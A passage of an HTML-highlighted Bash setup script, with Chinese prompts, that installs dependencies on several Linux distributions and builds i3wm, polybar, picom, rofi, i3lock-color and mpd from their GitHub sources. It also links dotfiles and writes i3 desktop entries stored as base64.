class="hljs-built_in">command</span> -v zypper    &amp;&amp; sudo zypper install  -y libuv-devel cairo-devel xcb-util-devel libxcb-devel xcb-proto-devel xcb-util-image-devel xcb-util-wm-devel lm-sensors xprop xdotool xev xwininfo pulseaudio pulseaudio-utils &amp;&amp; <span class="hljs-built_in">return</span> 0<br>    <span class="hljs-built_in">command</span> -v pacman  &amp;&amp; sudo pacman -S --needed --noconfirm --needed libuv cairo xcb-util libxcb xcb-proto-devel xcb-util-image xcb-util-wm lm_sensors xorg-xprop xdotool xorg-xev xorg-xwininfo pulseaudio &amp;&amp; <span class="hljs-built_in">return</span> 0<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">install_polybar_deps_opt</span></span>() &#123;<br>    <span class="hljs-built_in">command</span> -v apt-get   &amp;&amp; sudo apt-get install -y libxcb-xkb-dev libxcb-xrm-dev libxcb-cursor-dev libasound2-dev libpulse-dev libjsoncpp-dev libmpdclient-dev libcurl4-openssl-dev libnl-genl-3-dev &amp;&amp; <span class="hljs-built_in">return</span> 0<br>    <span class="hljs-built_in">command</span> -v dnf       &amp;&amp; sudo dnf install     -y xcb-util-xrm-devel xcb-util-cursor-devel alsa-lib-devel pulseaudio-libs-devel jsoncpp-devel libmpdclient-devel libcurl-devel libnl3-devel &amp;&amp; <span class="hljs-built_in">return</span> 0<br>    <span class="hljs-built_in">command</span> -v zypper    &amp;&amp; sudo zypper install  -y libxcb-xkb1 xcb-util-xrm-devel xcb-util-cursor-devel alsa-devel libpulse-devel jsoncpp-devel libmpdclient-devel libcurl-devel libnl3-devel &amp;&amp; <span class="hljs-built_in">return</span> 0<br>    <span class="hljs-built_in">command</span> -v pacman  &amp;&amp; sudo pacman -S --needed --noconfirm --needed libxcb xcb-util-xrm xcb-util-cursor alsa-lib libpulse jsoncpp libmpdclient libcurl-compat libnl &amp;&amp; <span class="hljs-built_in">return</span> 0<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">compile_polybar</span></span>() &#123;<br>    ! i3 -v &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;没找到 i3 命令，请确保先安装了 i3wm 环境后再安装 polybar&quot;</span> &amp;&amp; <span class="hljs-built_in">return</span> 1<br>    <span class="hljs-built_in">read</span> -t <span class="hljs-variable">$READ_TIMEOUT</span> -p <span class="hljs-string">&quot;`echo_green &#x27;输入安装目录,默认 /usr/local :&#x27;`&quot;</span> str_dst<br>    [[ <span class="hljs-string">&quot;<span class="hljs-variable">$str_dst</span>&quot;</span> == <span class="hljs-string">&quot;&quot;</span> ]] &amp;&amp; str_dst=<span class="hljs-string">&quot;/usr/local&quot;</span><br>    [[ ! -d <span class="hljs-string">&quot;<span class="hljs-variable">$str_dst</span>&quot;</span> ]] &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;设置的安装目录前缀不存在! [<span class="hljs-variable">$str_dst</span>]&quot;</span> &amp;&amp; <span class="hljs-built_in">return</span> 2<br>    tmp_path=<span class="hljs-variable">$&#123;tmp_dir&#125;</span>/polybar<br>    [[ -d <span class="hljs-variable">$tmp_path</span> ]] &amp;&amp; prompt <span class="hljs-string">&quot;`echo_red &#x27;检测到您已经克隆了代码，是否重新克隆代码&#x27;`&quot;</span> &amp;&amp; <span class="hljs-built_in">rm</span> -rf <span class="hljs-variable">$tmp_path</span><br><br>    install_build_deps<br>    install_polybar_deps<br>    install_polybar_deps_opt<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;gcc version : `gcc -dumpversion` , 推荐使用 gcc10 版本编译器(官方要求gcc&gt;=5.1)&quot;</span><br>    [[ -d <span class="hljs-string">&quot;<span class="hljs-variable">$tmp_path</span>&quot;</span> ]] || git <span class="hljs-built_in">clone</span> --recursive https://github.com/polybar/polybar <span class="hljs-variable">$&#123;tmp_path&#125;</span><br>    <span class="hljs-built_in">cd</span> <span class="hljs-variable">$tmp_path</span> &amp;&amp; ./build.sh --all-features --gcc --<span class="hljs-built_in">jobs</span> --auto<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">install_i3wm_deps</span></span>() &#123;<br>    <span class="hljs-built_in">command</span> -v apt-get &amp;&amp; sudo apt-get install   -y pkg-config libstartup-notification0-dev libxcb-xkb-dev libxcb-xinerama0-dev libxcb-cursor-dev libxcb-keysyms1-dev \<br>            libxcb-icccm4-dev libxcb-xrm-dev libxkbcommon-x11-dev libyajl-dev libcairo2-dev libpango1.0-dev libxfixes-dev libxcb-randr0-dev \<br>            libxcb-shape0-dev libev-dev<br>    <span class="hljs-built_in">command</span> -v dnf     &amp;&amp; sudo dnf install       -y pkg-config libxcb-devel xcb-util-devel libxkbcommon-devel libxkbcommon-x11-devel xcb-util-cursor-devel \<br>            xcb-util-wm-devel xcb-util-keysyms-devel xcb-util-xrm-devel libev-devel yajl-devel asciidoc \<br>            xmlto pcre2-devel startup-notification-devel pango-devel cairo-devel perl-ExtUtils-MakeMaker<br>    <span class="hljs-built_in">command</span> -v zypper  &amp;&amp; sudo zypper install    -y pkg-config libxcb-devel xcb-util-devel libxkbcommon-devel libxkbcommon-x11-devel xcb-util-cursor-devel \<br>            xcb-util-wm-devel xcb-util-keysyms-devel xcb-util-xrm-devel libev-devel libyajl-devel asciidoc \<br>            xmlto pcre2-devel startup-notification-devel pango-devel cairo-devel libiconv_hook-devel <br>    <span class="hljs-built_in">command</span> -v pacman  &amp;&amp; sudo pacman -S --needed --noconfirm --needed pkg-config libxcb xcb-util libxkbcommon libxkbcommon-x11 xcb-util-cursor \<br>            xcb-util-wm xcb-util-keysyms xcb-util-xrm libev yajl asciidoc \<br>            xmlto pcre2 startup-notification pango cairo libiconv<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">compile_i3wm</span></span>() &#123;<br>    tmp_path=<span class="hljs-string">&quot;<span class="hljs-variable">$tmp_dir</span>/i3wm&quot;</span><br>    i3 -v &gt;/dev/null 2&gt;&amp;1 &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;i3 命令已经安装过了&quot;</span> &amp;&amp; ! prompt <span class="hljs-string">&quot;仍然继续编译安装 i3 么? 建议手工卸载后再尝试&quot;</span> &amp;&amp; <span class="hljs-built_in">return</span> 1<br>    <span class="hljs-built_in">read</span> -t <span class="hljs-variable">$READ_TIMEOUT</span> -p <span class="hljs-string">&quot;`echo_green &#x27;输入安装目录,默认 /usr :&#x27;`&quot;</span> str_dst<br>    [[ <span class="hljs-string">&quot;<span class="hljs-variable">$str_dst</span>&quot;</span> == <span class="hljs-string">&quot;&quot;</span> ]] &amp;&amp; str_dst=<span class="hljs-string">&quot;/usr&quot;</span><br>    [[ ! -d <span class="hljs-string">&quot;<span class="hljs-variable">$str_dst</span>&quot;</span> ]] &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;设置的安装目录前缀不存在! [<span class="hljs-variable">$str_dst</span>]&quot;</span> &amp;&amp; <span class="hljs-built_in">return</span> 2<br>    <span class="hljs-comment"># read -t $READ_TIMEOUT -p &quot;`echo_green &#x27;选择代码分支 next/stable,默认next:&#x27;`&quot; str_branch</span><br>    [[ <span class="hljs-string">&quot;<span class="hljs-variable">$str_branch</span>&quot;</span> == <span class="hljs-string">&quot;&quot;</span> ]] &amp;&amp; str_branch=<span class="hljs-string">&quot;next&quot;</span><br>    [[ -d <span class="hljs-variable">$tmp_path</span> ]] &amp;&amp; prompt <span class="hljs-string">&quot;`echo_red &#x27;检测到您已经克隆了代码，是否重新克隆代码&#x27;`&quot;</span> &amp;&amp; <span class="hljs-built_in">rm</span> -rf <span class="hljs-variable">$tmp_path</span><br>    [[ -d <span class="hljs-string">&quot;<span class="hljs-variable">$tmp_path</span>&quot;</span> ]] || git <span class="hljs-built_in">clone</span> https://github.com/i3/i3.git <span class="hljs-variable">$tmp_path</span><br>    install_build_deps<br>    install_i3wm_deps<br>    <span class="hljs-built_in">cd</span> <span class="hljs-variable">$tmp_path</span> &amp;&amp; git checkout <span class="hljs-variable">$&#123;str_branch&#125;</span> &amp;&amp; <span class="hljs-built_in">mkdir</span> -p build &amp;&amp; <span class="hljs-built_in">cd</span> build &amp;&amp; meson --prefix=<span class="hljs-variable">$&#123;str_dst&#125;</span> -Ddocs=<span class="hljs-literal">false</span> -Dmans=<span class="hljs-literal">false</span> .. &amp;&amp; ninja &amp;&amp; sudo ninja install<br>    [[ -x <span class="hljs-string">&quot;<span class="hljs-variable">$str_dst</span>/bin/i3&quot;</span> ]] || <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;安装失败!&quot;</span> &amp;&amp; <span class="hljs-built_in">return</span> 3<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;i3wm 安装成功,当前 i3wm 版本: `i3 -v`&quot;</span><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">install_picom_deps</span></span>() &#123;<br>    <span class="hljs-built_in">command</span> -v apt-get  &gt;/dev/null 2&gt;&amp;1 &amp;&amp; sudo apt-get install -y libxext-dev libxcb1-dev libxcb-util-dev libxcb-damage0-dev libxcb-dpms0-dev libxcb-xfixes0-dev libxcb-shape0-dev libxcb-render-util0-dev libxcb-render0-dev libxcb-randr0-dev libxcb-composite0-dev libxcb-image0-dev libxcb-present-dev libxcb-glx0-dev libpixman-1-dev libdbus-1-dev libconfig-dev libgl-dev libegl-dev libpcre2-dev libevdev-dev uthash-dev libev-dev libx11-xcb-dev<br>    <span class="hljs-built_in">command</span> -v dnf      &gt;/dev/null 2&gt;&amp;1 &amp;&amp; sudo dnf     install -y dbus-devel libconfig-devel libdrm-devel libev-devel libX11-devel libX11-xcb libXext-devel libxcb-devel libGL-devel libEGL-devel pcre2-devel pixman-devel uthash-devel xcb-util-image-devel xcb-util-renderutil-devel xorg-x11-proto-devel<br>    <span class="hljs-built_in">command</span> -v zypper   &gt;/dev/null 2&gt;&amp;1 &amp;&amp; sudo zypper  install -y dbus-1-devel libX11-devel libX11-xcb1 libXext-devel xproto-devel \<br>                libxcb-devel libpixman-1-0-devel Mesa-libGL-devel Mesa-libEGL-devel pcre2-devel libev-devel uthash-devel \<br>                libconfig-devel libxcb-composite0 libxcb-damage0 libxcb-dpms0 libxcb-glx0 libxcb-image0 libxcb-present0 \<br>                libxcb-randr0 libxcb-render0 libxcb-shape0 libxcb-xfixes0<br>    <span class="hljs-built_in">command</span> -v pacman  &amp;&amp; sudo pacman -S --needed --noconfirm --needed dbus libx11 libxext \<br>                libxcb pixman mesa pcre2 libev uthash libconfig<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">compile_picom</span></span>() &#123;<br>    url=<span class="hljs-string">&quot;https://github.com/yshui/picom.git&quot;</span><br>    tmp_path=<span class="hljs-variable">$tmp_dir</span>/picom<br>    [[ -d <span class="hljs-string">&quot;<span class="hljs-variable">$tmp_path</span>&quot;</span> ]] &amp;&amp; prompt <span class="hljs-string">&quot;已经克隆过代码，是否重新克隆?&quot;</span> &amp;&amp; <span class="hljs-built_in">rm</span> -rf <span class="hljs-string">&quot;<span class="hljs-variable">$tmp_path</span>&quot;</span><br>    [[ -d <span class="hljs-string">&quot;<span class="hljs-variable">$tmp_path</span>&quot;</span> ]] || git <span class="hljs-built_in">clone</span> <span class="hljs-variable">$url</span> <span class="hljs-variable">$tmp_path</span><br>    [[ ! -d <span class="hljs-string">&quot;<span class="hljs-variable">$tmp_path</span>&quot;</span> ]] &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;克隆代码失败!稍后再重试!&quot;</span> &amp;&amp; <span class="hljs-built_in">return</span> 0<br>    <br>    <span class="hljs-built_in">read</span> -t <span class="hljs-variable">$READ_TIMEOUT</span> -p <span class="hljs-string">&quot;`echo_green &#x27;输入安装目录,默认 /usr/local :&#x27;`&quot;</span> str_dst<br>    [[ <span class="hljs-string">&quot;<span class="hljs-variable">$str_dst</span>&quot;</span> == <span class="hljs-string">&quot;&quot;</span> ]] &amp;&amp; str_dst=<span class="hljs-string">&quot;/usr/local&quot;</span><br>    [[ ! -d <span class="hljs-string">&quot;<span class="hljs-variable">$str_dst</span>&quot;</span> ]] &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;设置的安装目录前缀不存在! [<span class="hljs-variable">$str_dst</span>]&quot;</span> &amp;&amp; <span class="hljs-built_in">return</span> 2<br>    <span class="hljs-comment"># read -t $READ_TIMEOUT -p &quot;`echo_green &#x27;选择代码分支 next/stable,默认next:&#x27;`&quot; str_branch</span><br>    [[ <span class="hljs-string">&quot;<span class="hljs-variable">$str_branch</span>&quot;</span> == <span class="hljs-string">&quot;&quot;</span> ]] &amp;&amp; str_branch=<span class="hljs-string">&quot;next&quot;</span><br>    <br>    install_build_deps<br>    install_picom_deps<br>    <span class="hljs-built_in">cd</span> <span class="hljs-variable">$tmp_path</span> &amp;&amp; git checkout <span class="hljs-variable">$&#123;str_branch&#125;</span> &amp;&amp; git submodule update --init --recursive<br>    meson setup --prefix=<span class="hljs-variable">$&#123;str_dst&#125;</span> --buildtype=release . build   &amp;&amp; ninja -C build &amp;&amp; sudo ninja -C build install<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">install_dotfiles</span></span>() &#123;<br>    <span class="hljs-comment"># 克隆自己的 dotfiles 配置文档</span><br>    tmp_path=<span class="hljs-variable">$dotfiles_path</span><br>    [[ -d <span class="hljs-string">&quot;<span class="hljs-variable">$tmp_path</span>&quot;</span> ]] &amp;&amp; prompt <span class="hljs-string">&quot;`echo_redr \&quot;<span class="hljs-variable">$tmp_path</span> 代码已经克隆过， 是否重新克隆安装?\&quot;`&quot;</span> &amp;&amp; <span class="hljs-built_in">mv</span> <span class="hljs-variable">$&#123;tmp_path&#125;</span> <span class="hljs-variable">$&#123;tmp_path&#125;</span>.`<span class="hljs-built_in">date</span> +%Y%m%d%H%M`<br>    [[ -d <span class="hljs-string">&quot;<span class="hljs-variable">$tmp_path</span>&quot;</span> ]] || git <span class="hljs-built_in">clone</span> --depth=1 --shallow-submodules --recurse-submodules https://github.com/switchToLinux/dotfiles.git <span class="hljs-variable">$tmp_path</span><br>    <span class="hljs-built_in">cd</span> <span class="hljs-variable">$tmp_path</span> || <span class="hljs-built_in">return</span> 1<br><br>    create_symlink <span class="hljs-variable">$tmp_path</span>/i3_polybar ~/.config/i3<br>    meta_key=<span class="hljs-string">&quot;Mod1&quot;</span><br>    prompt <span class="hljs-string">&quot;是否使用Alt键作为\$mod键(y--选择Alt键,N-选择Supper/Win键)&quot;</span> || meta_key=<span class="hljs-string">&quot;Mod4&quot;</span><br>    sed -i <span class="hljs-string">&quot;s/^set \$mod .*/set \$mod <span class="hljs-variable">$&#123;meta_key&#125;</span>/g&quot;</span> ~/.config/i3/config<br>    menu_head <span class="hljs-string">&quot;已经选择 <span class="hljs-variable">$meta_key</span> 作为 \$mod 键(Mod1:Alt,Mod4:Super)&quot;</span><br><br>    create_symlink <span class="hljs-variable">$tmp_path</span>/polybar_themes ~/.config/polybar_themes<br>    create_symlink <span class="hljs-variable">$tmp_path</span>/picom ~/.config/picom<br>    <span class="hljs-built_in">mkdir</span> -p ~/.local/share/mpd<br>    create_symlink <span class="hljs-variable">$tmp_path</span>/mpd ~/.config/mpd<br>    create_symlink <span class="hljs-variable">$tmp_path</span>/dunst ~/.config/dunst<br>    create_symlink <span class="hljs-variable">$tmp_path</span>/ranger ~/.config/ranger<br>    <span class="hljs-comment"># replace by rofi_themes</span><br>    <span class="hljs-comment"># create_symlink $tmp_path/rofi ~/.config/rofi</span><br>    create_symlink <span class="hljs-variable">$tmp_path</span>/ncmpcpp ~/.config/ncmpcpp<br><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;配置 ~/.Xresources 文件&quot;</span><br>    create_symlink <span class="hljs-variable">$tmp_path</span>/Xresources ~/.Xresources<br>    create_symlink <span class="hljs-variable">$tmp_path</span>/Xresources.d ~/.config/Xresources.d<br><br>    i3_desktop_data=<span class="hljs-string">&quot;W0Rlc2t0b3AgRW50cnldCk5hbWU9aTMKQ29tbWVudD1pbXByb3ZlZCBkeW5hbWljIHRpbGluZyB3aW5kb3cgbWFuYWdlcgpFeGVjPWkzClRyeUV4ZWM9aTMKVHlwZT1BcHBsaWNhdGlvbgpYLUxpZ2h0RE0tRGVza3RvcE5hbWU9aTMKRGVza3RvcE5hbWVzPWkzCktleXdvcmRzPXRpbGluZzt3bTt3aW5kb3dtYW5hZ2VyO3dpbmRvdzttYW5hZ2VyOwoK&quot;</span><br>    sudo sh -c <span class="hljs-string">&quot;echo <span class="hljs-variable">$i3_desktop_data</span>| base64 -d &gt; /usr/share/xsessions/i3.desktop&quot;</span><br><br>    desktop_data=<span class="hljs-string">&quot;W0Rlc2t0b3AgRW50cnldCkVuY29kaW5nPVVURi04ClR5cGU9QXBwbGljYXRpb24KTmFtZT1pMwpOb0Rpc3BsYXk9dHJ1ZQpHZW5lcmljTmFtZT1BIGR5bmFtaWMgdGlsaW5nIHdpbmRvdyBtYW5hZ2VyCkNvbW1lbnQ9aW1wcm92ZWQgZHluYW1pYyB0aWxpbmcgd2luZG93IG1hbmFnZXIKSWNvbj1pMwpFeGVjPWkzClgtR05PTUUtV01OYW1lPWkzClgtR05PTUUtQXV0b3N0YXJ0LVBoYXNlPVdpbmRvd01hbmFnZXIKWC1HTk9NRS1Qcm92aWRlcz13aW5kb3dtYW5hZ2VyClgtR05PTUUtQXV0b3N0YXJ0LU5vdGlmeT1mYWxzZQoK&quot;</span><br>    sudo sh -c <span class="hljs-string">&quot;echo <span class="hljs-variable">$desktop_data</span> | base64 -d &gt; /usr/share/applications/i3.desktop&quot;</span><br><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;配置 neovim 环境&quot;</span><br>    create_symlink <span class="hljs-variable">$tmp_path</span>/nvim ~/.config/nvim<br><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;配置 xfce4-terminal 环境&quot;</span><br>    <span class="hljs-built_in">mkdir</span> -p ~/.config/xfce4<br>    create_symlink <span class="hljs-variable">$tmp_path</span>/xfce4_terminal ~/.config/xfce4/terminal<br>    <br>    <span class="hljs-comment"># picom 使用gpu 时 ，设置 glx , 使用cpu时设置 xrender</span><br>    <span class="hljs-comment"># 如果 nvidia-smi 命令 或 amdgpu-pro 命令存在 则使用 glx ， 否则使用 xrender</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">command</span> -v nvidia-smi &gt;/dev/null 2&gt;&amp;1 || <span class="hljs-built_in">command</span> -v amdgpu-pro &gt;/dev/null 2&gt;&amp;1; <span class="hljs-keyword">then</span><br>        backend=<span class="hljs-string">&quot;glx&quot;</span><br>    <span class="hljs-keyword">else</span><br>        backend=<span class="hljs-string">&quot;xrender&quot;</span><br>    <span class="hljs-keyword">fi</span><br><br>    <span class="hljs-comment"># 替换配置文件中的 backend 配置</span><br>    menu_head <span class="hljs-string">&quot;设置 picom 使用的后端为 <span class="hljs-variable">$backend</span> , 如果有独显则可以使用 glx&quot;</span><br>    sed -i <span class="hljs-string">&quot;s/^backend = .*/backend = \&quot;<span class="hljs-variable">$backend</span>\&quot;/&quot;</span> ~/.config/picom/picom.conf<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;完成 dotfiles 配置任务!&quot;</span><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">install_i3lock_deps</span></span>() &#123;<br>    <span class="hljs-built_in">command</span> -v apt-get &gt;/dev/null 2&gt;&amp;1 &amp;&amp; sudo apt-get   install -y libjpeg-dev libpam0g-dev<br>    <span class="hljs-built_in">command</span> -v dnf      &gt;/dev/null 2&gt;&amp;1 &amp;&amp; sudo dnf      install -y libjpeg-turbo-devel pam pam-devel<br>    <span class="hljs-built_in">command</span> -v zypper &gt;/dev/null 2&gt;&amp;1 &amp;&amp; sudo zypper     install -y libjpeg8-devel pam pam-devel<br>    <span class="hljs-built_in">command</span> -v pacman  &amp;&amp; sudo pacman -S --needed --noconfirm --needed libjpeg-turbo pam<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">compile_i3lock_color</span></span>() &#123;<br>    prompt <span class="hljs-string">&quot;编译安装 i3lock-color&quot;</span> || <span class="hljs-built_in">return</span> 1<br>    url=<span class="hljs-string">&quot;https://github.com/Raymo111/i3lock-color.git&quot;</span><br>    tmp_path=<span class="hljs-variable">$tmp_dir</span>/i3lock-color<br>    [[ -d <span class="hljs-string">&quot;<span class="hljs-variable">$tmp_path</span>&quot;</span> ]] &amp;&amp; prompt <span class="hljs-string">&quot;已经克隆过代码，是否重新克隆?&quot;</span> &amp;&amp; <span class="hljs-built_in">rm</span> -rf <span class="hljs-string">&quot;<span class="hljs-variable">$tmp_path</span>&quot;</span><br>    [[ -d <span class="hljs-string">&quot;<span class="hljs-variable">$tmp_path</span>&quot;</span> ]] || git <span class="hljs-built_in">clone</span> <span class="hljs-variable">$url</span> <span class="hljs-variable">$tmp_path</span><br>    [[ ! -d <span class="hljs-string">&quot;<span class="hljs-variable">$tmp_path</span>&quot;</span> ]] &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;克隆代码失败!稍后再重试!&quot;</span> &amp;&amp; <span class="hljs-built_in">return</span> 0<br><br>    install_i3lock_deps<br>    install_build_deps<br>    <span class="hljs-built_in">cd</span> <span class="hljs-variable">$tmp_path</span> &amp;&amp; ./install-i3lock-color.sh<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">install_rofi_deps</span></span>()&#123;<br>    <span class="hljs-built_in">command</span> -v apt-get &gt;/dev/null 2&gt;&amp;1 &amp;&amp; sudo apt-get   install -y libgdk-pixbuf-2.0-dev bison flex flex-doc<br>    <span class="hljs-built_in">command</span> -v dnf      &gt;/dev/null 2&gt;&amp;1 &amp;&amp; sudo dnf      install -y ghc-gi-gdkpixbuf-devel<br>    <span class="hljs-built_in">command</span> -v zypper &gt;/dev/null 2&gt;&amp;1 &amp;&amp; sudo zypper     install -y gdk-pixbuf-devel flex<br>    <span class="hljs-built_in">command</span> -v pacman  &amp;&amp; sudo pacman -S --needed --noconfirm --needed gdk-pixbuf2 flex<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">compile_rofi</span></span>() &#123;<br>    prompt <span class="hljs-string">&quot;编译安装 rofi&quot;</span> || <span class="hljs-built_in">return</span> 1<br>    url=<span class="hljs-string">&quot;https://github.com/davatorium/rofi.git&quot;</span><br>    tmp_path=<span class="hljs-variable">$tmp_dir</span>/rofi<br>    [[ -d <span class="hljs-string">&quot;<span class="hljs-variable">$tmp_path</span>&quot;</span> ]] &amp;&amp; prompt <span class="hljs-string">&quot;已经克隆过代码，是否重新克隆?&quot;</span> &amp;&amp; <span class="hljs-built_in">rm</span> -rf <span class="hljs-string">&quot;<span class="hljs-variable">$tmp_path</span>&quot;</span><br>    [[ -d <span class="hljs-string">&quot;<span class="hljs-variable">$tmp_path</span>&quot;</span> ]] || git <span class="hljs-built_in">clone</span> --recursive <span class="hljs-variable">$url</span> <span class="hljs-variable">$tmp_path</span><br>    [[ ! -d <span class="hljs-string">&quot;<span class="hljs-variable">$tmp_path</span>&quot;</span> ]] &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;克隆代码失败!稍后再重试!&quot;</span> &amp;&amp; <span class="hljs-built_in">return</span> 0<br><br>    <span class="hljs-built_in">read</span> -t <span class="hljs-variable">$READ_TIMEOUT</span> -p <span class="hljs-string">&quot;`echo_green &#x27;输入安装目录,默认 /usr/local :&#x27;`&quot;</span> str_dst<br>    [[ <span class="hljs-string">&quot;<span class="hljs-variable">$str_dst</span>&quot;</span> == <span class="hljs-string">&quot;&quot;</span> ]] &amp;&amp; str_dst=<span class="hljs-string">&quot;/usr/local&quot;</span><br>    [[ ! -d <span class="hljs-string">&quot;<span class="hljs-variable">$str_dst</span>&quot;</span> ]] &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;设置的安装目录前缀不存在! [<span class="hljs-variable">$str_dst</span>]&quot;</span> &amp;&amp; <span class="hljs-built_in">return</span> 2<br>    <span class="hljs-comment"># read -t $READ_TIMEOUT -p &quot;`echo_green &#x27;选择代码分支 next/stable,默认next:&#x27;`&quot; str_branch</span><br>    [[ <span class="hljs-string">&quot;<span class="hljs-variable">$str_branch</span>&quot;</span> == <span class="hljs-string">&quot;&quot;</span> ]] &amp;&amp; str_branch=<span class="hljs-string">&quot;next&quot;</span><br><br>    install_rofi_deps<br>    install_build_deps<br>    <span class="hljs-built_in">cd</span> <span class="hljs-variable">$tmp_path</span> &amp;&amp; git checkout <span class="hljs-variable">$str_branch</span> &amp;&amp; meson setup build --prefix=<span class="hljs-variable">$&#123;str_dst&#125;</span> &amp;&amp;  ninja -C build &amp;&amp; sudo ninja -C build install<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">install_mpd_deps</span></span>() &#123;<br>    <span class="hljs-built_in">command</span> -v apt-get &amp;&amp; sudo apt-get install -y meson g++ \<br>        libfmt-dev libpcre2-dev libmad0-dev libmpg123-dev libid3tag0-dev \<br>        libflac-dev libvorbis-dev libopus-dev libogg-dev \<br>        libadplug-dev libaudiofile-dev libsndfile1-dev libfaad-dev \<br>        libfluidsynth-dev libgme-dev libmikmod-dev libmodplug-dev \<br>        libmpcdec-dev libwavpack-dev libwildmidi-dev \<br>        libsidplay2-dev libsidutils-dev libresid-builder-dev libavcodec-dev libavformat-dev \<br>        libmp3lame-dev libtwolame-dev libshine-dev libsamplerate0-dev libsoxr-dev \<br>        libbz2-dev libcdio-paranoia-dev libiso9660-dev libmms-dev \<br>        libzzip-dev libcurl4-gnutls-dev libyajl-dev libexpat-dev \<br>        libasound2-dev libao-dev libjack-jackd2-dev libopenal-dev \<br>        libpulse-dev libshout3-dev libsndio-dev libmpdclient-dev \<br>        libnfs-dev libupnp-dev libavahi-client-dev libsqlite3-dev libsystemd-dev \<br>        libgtest-dev libboost-dev libicu-dev libchromaprint-dev libgcrypt20-dev<br>    <span class="hljs-built_in">command</span> -v dnf    &amp;&amp; sudo dnf      install -y fmt-devel pcre2-devel libmad-devel mpg123-devel libid3tag-devel \<br>        flac-devel libvorbis-devel libopusenc-devel libogg-devel adplug-devel audiofile-devel libsndfile-devel faad2-devel \<br>        fluidsynth-devel libmikmod-devel libmodplug-devel libmpcdec-devel wavpack-devel wildmidi-devel \<br>        libsidplayfp-devel ffmpeg ffmpeg-libs lame-devel twolame-devel libsamplerate-devel soxr-devel \<br>        bzip2-devel libcdio-paranoia-devel libisofs-devel libmms-devel zziplib-devel libcurl-devel \<br>        yajl-devel expat-devel SAASound-devel libao-devel openal-soft-devel \<br>        pulseaudio-libs-devel libshout-devel libmpdclient-devel libnfs-devel libupnp-devel avahi-devel \<br>        libsqlite3x-devel systemd-devel gtest-devel boost-devel libicu-devel libchromaprint-devel libgcrypt-devel<br>        <span class="hljs-comment"># no install: libgme libsidutils libresid-builder-dev libshine libjack-jackd2-dev libsndio-dev</span><br>    <span class="hljs-built_in">command</span> -v zypper &amp;&amp; sudo zypper     install -y fmt-devel pcre2-devel libmad-devel mpg123-devel libid3tag-devel \<br>        flac-devel libvorbis-devel libopus-devel libogg-devel audiofile-devel libsndfile-devel libfaad-devel \<br>        fluidsynth-devel libgme-devel  libmikmod-devel libmodplug-devel libmpcdec-devel wavpack-devel wildmidi-devel \<br>        libsidplayfp-devel ffmpeg libavcodec-devel libavformat-devel libmp3lame-devel libtwolame-devel libshine-devel libsamplerate-devel soxr-devel \<br>        libbz2-devel libcdio-paranoia-devel libisofs-devel libmms-devel zziplib-devel libcurl-devel \<br>        libyajl-devel libexpat-devel libasound2 libsoundio-devel libao-devel libjack-devel openal-soft-devel \<br>        libpulse-devel libshout-devel sndio-devel libmpdclient-devel libnfs-devel libupnp-devel libavahi-client3 \<br>        sqlite3-devel systemd-devel gtest libboost_headers-devel libicu-devel libchromaprint-devel libgcrypt-devel<br>        <span class="hljs-comment"># no install: adplug libsidutils libresid-builder-dev </span><br>    <span class="hljs-built_in">command</span> -v pacman &amp;&amp; sudo pacman -S --needed --noconfirm --needed <span class="hljs-built_in">fmt</span> pcre2 libmad mpg123 libid3tag flac libvorbis opus libogg \<br>        audiofile libsndfile faad2 fluidsynth libgme libmikmod libmodplug \<br>        libmpcdec wavpack wildmidi libsidplayfp ffmpeg lame twolame libsamplerate libsoxr bzip2 \<br>        libcdio-paranoia libisofs libmms zziplib libcurl-compat yajl expat alsa-lib libao jack2 \<br>        openal libpulse libshout sndio libmpdclient libnfs libupnp avahi sqlite systemd-libs \<br>        gtest boost-libs icu chromaprint chromaprint<br><br>        <span class="hljs-comment"># adplug shine \</span><br>        <span class="hljs-comment"># https://github.com/adplug/adplug</span><br>        <span class="hljs-comment"># https://github.com/mcfiredrill/libgme</span><br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">compile_mpd</span></span>() &#123;<br>    prompt <span class="hljs-string">&quot;编译安装 mpd(libavcodec等库需要第三方源)&quot;</span> || <span class="hljs-built_in">return</span> 1<br>    url=<span class="hljs-string">&quot;https://github.com/MusicPlayerDaemon/MPD.git&quot;</span><br>    tmp_path=<span class="hljs-variable">$tmp_dir</span>/mpd<br>    [[ -d <span class="hljs-string">&quot;<span class="hljs-variable">$tmp_path</span>&quot;</span> ]] &amp;&amp; prompt <span 